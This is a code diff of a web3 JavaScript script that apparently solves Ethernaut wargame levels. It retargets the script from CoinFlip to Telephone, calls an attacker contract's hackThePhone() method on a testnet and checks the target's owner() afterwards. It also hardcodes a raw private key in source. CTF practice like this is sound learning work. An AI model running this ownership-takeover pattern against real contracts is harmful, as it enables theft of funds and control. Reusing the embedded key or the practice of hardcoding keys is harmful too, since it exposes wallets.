@@ -8,23 +8,23 @@ const web3 = new Web3(infuraProvider);
 const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
 const account = web3.eth.accounts.privateKeyToAccount(privateKey);
 
-const flipCoinSolArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/CoinFlipSol.json')));
-const flipCoinArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/CoinFlip.json')));
-const flipCoinAddress = '0x8a90c284dcf34f61f79279a3f442fd9b9c2a875e';
-const flipCoinSolAddress = flipCoinSolArtifact.networks['3'].address;
-debugEthernaut('flipCoinSolAddress', flipCoinSolAddress);
-const flipCoinSol = new web3.eth.Contract(flipCoinSolArtifact.abi, flipCoinSolAddress);
-const flipCoin = new web3.eth.Contract(flipCoinArtifact.abi, flipCoinAddress);
+const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/TelephoneSol.json')));
+const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Telephone.json')));
+const address = '0x9d84c8e81bb9a7569e554d87f3b140c92b6f20ec';
+const solAddress = solArtifact.networks['3'].address;
+debugEthernaut('solAddress', solAddress);
+const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
+const contract = new web3.eth.Contract(artifact.abi, address);
 
 const ethernaut = async () => {
   try {
-    const estimatedGas = await flipCoinSol.methods.hackIt().estimateGas();
+    const estimatedGas = await solContract.methods.hackThePhone().estimateGas();
     debugEthernaut('estimated gas', estimatedGas);
-    const transactionData = await flipCoinSol.methods.hackIt().encodeABI();
+    const transactionData = await solContract.methods.hackThePhone().encodeABI();
     debugEthernaut('data', transactionData);
     const transaction = {
       from: account.address,
-      to: flipCoinSolAddress,
+      to: solAddress,
       data: transactionData,
       gasLimit: estimatedGas * 100,
       // gasPrice: utils.toWei(20, 'Gwei'),
@@ -35,8 +35,8 @@ const ethernaut = async () => {
     debugEthernaut('signedTx:\n', signedTx);
     const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
     debugEthernaut('txResult:\n', txResult);
-    const consecutiveWins = await flipCoin.methods.consecutiveWins().call();
-    debugEthernaut('consecutiveWins', consecutiveWins);
+    const owner = await contract.methods.owner().call();
+    debugEthernaut('owner', owner);
   } catch (error) {
     debugError(error);
   }
